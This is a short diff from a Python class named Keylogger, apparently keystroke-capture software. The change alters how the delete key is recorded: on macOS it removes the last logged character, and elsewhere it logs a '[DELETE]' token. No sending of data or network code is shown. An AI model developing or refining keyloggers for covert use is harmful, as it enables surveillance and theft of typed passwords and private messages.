@@ -57,7 +57,14 @@ class Keylogger:
                 except:
                     pass
             elif name == "delete":
-                print(sys.platform)
+                if sys.platform == "darwin":
+                    try:
+                        self.log = self.log[:len(self.log)-1]
+                        return
+                    except:
+                        pass
+                else:
+                    name = " [DELETE] "
             else:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
